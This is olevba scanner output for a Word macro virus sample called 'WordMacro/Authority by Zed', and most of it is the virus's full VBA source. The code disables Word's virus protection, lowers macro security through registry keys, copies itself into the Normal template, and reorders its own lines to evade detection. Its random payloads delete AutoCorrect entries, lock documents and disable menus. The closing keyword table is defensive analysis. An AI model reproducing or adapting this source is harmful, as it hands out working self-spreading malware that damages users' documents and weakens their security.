olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aurity-d137f9ce58a14439981d49bfa3ce70ac8b83c91d
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Aurity-d137f9ce58a14439981d49bfa3ce70ac8b83c91d 
in file: Virus.MSWord.Aurity-d137f9ce58a14439981d49bfa3ce70ac8b83c91d - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Authority > �������������������
Private Sub Document_Open()
On Error Resume Next
With Options
.VirusProtection = False: .SaveNormalPrompt = False: .ConfirmConversions = False
End With
SoftwareKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\"
SecurityKey = Application.Version & "\Word\Security"
OfficeKey = SoftwareKey & SecurityKey
For CLoop = 0 To 1
KeyArray = Array("Level", "AccessVBOM")
System.PrivateProfileString("", OfficeKey, KeyArray(CLoop)) = 1&
Next CLoop
Set DocTT = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set DocNT = NormalTemplate.VBProject.VBComponents(1).CodeModule
TTMarker = Left(DocTT.Lines(1, 1), 13)
NTMarker = Left(DocNT.Lines(1, 1), 13)
Randomize
For RLoop = 1 To Int((30 * Rnd) + 1)
Randomize
If Int((2 * Rnd) + 1) = 1 Then
RCase = 199
Else
RCase = 197
End If
Randomize
R = R & Chr(Int((26 * Rnd) + RCase))
Next
If TTMarker <> "'Authority > " Then
Do
e = e + 1
NTLines = NTLines & DocNT.Lines(e, 1) & vbCrLf
Loop Until e = DocNT.CountOfLines
DocTT.DeleteLines 1, DocTT.CountOfLines
DocTT.InsertLines 1, Left(NTLines, Len(NTLines) - 2)
DocTT.ReplaceLine 1, "'Authority > " & R
DocTT.ReplaceLine 2, "Private Sub Document_Open()"
TTC = True
End If
If NTMarker <> "'Authority > " Then
Do
C = C + 1
TTLines = TTLines & DocTT.Lines(C, 1) & vbCrLf
Loop Until C = DocTT.CountOfLines
DocNT.DeleteLines 1, DocNT.CountOfLines
DocNT.InsertLines 1, Left(TTLines, Len(TTLines) - 2)
DocNT.ReplaceLine 1, "'Authority > " & R
DocNT.ReplaceLine 2, "Private Sub Document_Close()"
NTC = True
End If
If TTC = True Then
Randomize
If Int((2 * Rnd) + 1) = 1 Then
C1 = 29: C2 = 30: C3 = 31: C4 = 32: C5 = 33: C6 = 34
C7 = 35: C8 = 36: C9 = 37: C10 = 38: C11 = 39
K1 = 40: K2 = 41: K3 = 42: K4 = 43: K5 = 44: K6 = 45
K7 = 46: K8 = 47: K9 = 48: K10 = 49: K11 = 50
Else
C1 = 40: C2 = 41: C3 = 42: C4 = 43: C5 = 44: C6 = 45
C7 = 46: C8 = 47: C9 = 48: C10 = 49: C11 = 50
K1 = 29: K2 = 30: K3 = 31: K4 = 32: K5 = 33: K6 = 34
K7 = 35: K8 = 36: K9 = 37: K10 = 38: K11 = 39
End If
With DocTT
.ReplaceLine C1, "If TTMarker <> ""'Authority > "" Then"
.ReplaceLine C2, "Do"
.ReplaceLine C3, "e = e + 1"
.ReplaceLine C4, "NTLines = NTLines & DocNT.Lines(e, 1) & vbCrLf"
.ReplaceLine C5, "Loop Until e = DocNT.CountOfLines"
.ReplaceLine C6, "DocTT.DeleteLines 1, DocTT.CountOfLines"
.ReplaceLine C7, "DocTT.InsertLines 1, Left(NTLines, Len(NTLines) - 2)"
.ReplaceLine C8, "DocTT.ReplaceLine 1, ""'Authority > "" & R"
.ReplaceLine C9, "DocTT.ReplaceLine 2, ""Private Sub Document_Open()"""
.ReplaceLine C10, "TTC = True"
.ReplaceLine C11, "End If"
.ReplaceLine K1, "If NTMarker <> ""'Authority > "" Then"
.ReplaceLine K2, "Do"
.ReplaceLine K3, "c = c + 1"
.ReplaceLine K4, "TTLines = TTLines & DocTT.Lines(c, 1) & vbCrLf"
.ReplaceLine K5, "Loop Until c = DocTT.CountOfLines"
.ReplaceLine K6, "DocNT.DeleteLines 1, DocNT.CountOfLines"
.ReplaceLine K7, "DocNT.InsertLines 1, Left(TTLines, Len(TTLines) - 2)"
.ReplaceLine K8, "DocNT.ReplaceLine 1, ""'Authority > "" & R"
.ReplaceLine K9, "DocNT.ReplaceLine 2, ""Private Sub Document_Close()"""
.ReplaceLine K10, "NTC = True"
.ReplaceLine K11, "End If"
End With
E1 = "VirusProtection"
E2 = "SaveNormalPrompt"
E3 = "ConfirmConversions"
EF = " = False"
EN = ": ."
Randomize
Select Case Int((6 * Rnd) + 1)
Case 1: RL = Chr(46) & E1 & EF & EN & E2 & EF & EN & E3 & EF
Case 2: RL = Chr(46) & E1 & EF & EN & E3 & EF & EN & E2 & EF
Case 3: RL = Chr(46) & E2 & EF & EN & E1 & EF & EN & E3 & EF
Case 4: RL = Chr(46) & E2 & EF & EN & E3 & EF & EN & E1 & EF
Case 5: RL = Chr(46) & E3 & EF & EN & E1 & EF & EN & E2 & EF
Case 6: RL = Chr(46) & E3 & EF & EN & E2 & EF & EN & E1 & EF
End Select
DocTT.ReplaceLine 5, RL
RC1 = ".VBProject.VBComponents(1).CodeModule"
RC2 = "Set DocTT = ActiveDocument"
RC3 = "Set DocNT = NormalTemplate"
Randomize
If Int((2 * Rnd) + 1) = 1 Then
O1 = RC2 & RC1
O2 = RC3 & RC1
Else
O1 = RC3 & RC1
O2 = RC2 & RC1
End If
DocTT.ReplaceLine 14, O1
DocTT.ReplaceLine 15, O2
Randomize
If Int((2 * Rnd) + 1) = 1 Then
L1 = "NT": L2 = "TT"
Else
L1 = "TT": L2 = "NT"
End If
LC1 = "Marker = Left(Doc"
LC2 = ".Lines(1, 1), 13)"
DocTT.ReplaceLine 16, L1 & LC1 & L1 & LC2
DocTT.ReplaceLine 17, L2 & LC1 & L2 & LC2
NXT = "Next"
Randomize
If Int((2 * Rnd) + 1) = 1 Then
CL = NXT & " CLoop"
Else
CL = NXT
End If
DocTT.ReplaceLine 13, CL
RCL = "RCase = "
Randomize
If Int((2 * Rnd) + 1) = 1 Then
RN1 = "197": RN2 = "199"
Else
RN1 = "199": RN2 = "197"
End If
DocTT.ReplaceLine 22, RCL & RN1
DocTT.ReplaceLine 24, RCL & RN2
End If
Randomize
RndLoop = Int((199 * Rnd) + 1)
If RndLoop = 9 Then
For ACLoop = 1 To AutoCorrect.Entries.Count
AutoCorrect.Entries.Item(ACLoop).Delete
Next
End If
If RndLoop = 8 Then
ActiveDocument.Protect Password:="Authority", NoReset:=False, Type:= _
wdAllowOnlyRevisions
End If
If RndLoop = 7 Then
For CBLoop = 1 To CommandBars.Count
CommandBars(CBLoop).Enabled = False
Next
End If
If RndLoop = 6 Then
With Assistant.NewBalloon
.Text = "WordMacro/Authority by Zed"
.Animation = msoAnimationGetAttentionMajor
.Heading = "Authority"
.Icon = msoIconAlertInfo
.Show
End With
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Zed\Authority", "") = "WordMacro/Authority.A by Zed"
LeftName = Left(ActiveDocument.Name, 8)
RightName = Right(ActiveDocument.Name, 1)
If LeftName = "Document" And IsNumeric(RightName) = True Then
ActiveDocument.Saved = True
Else
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End Sub
'WordMacro/Authority by Zed
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

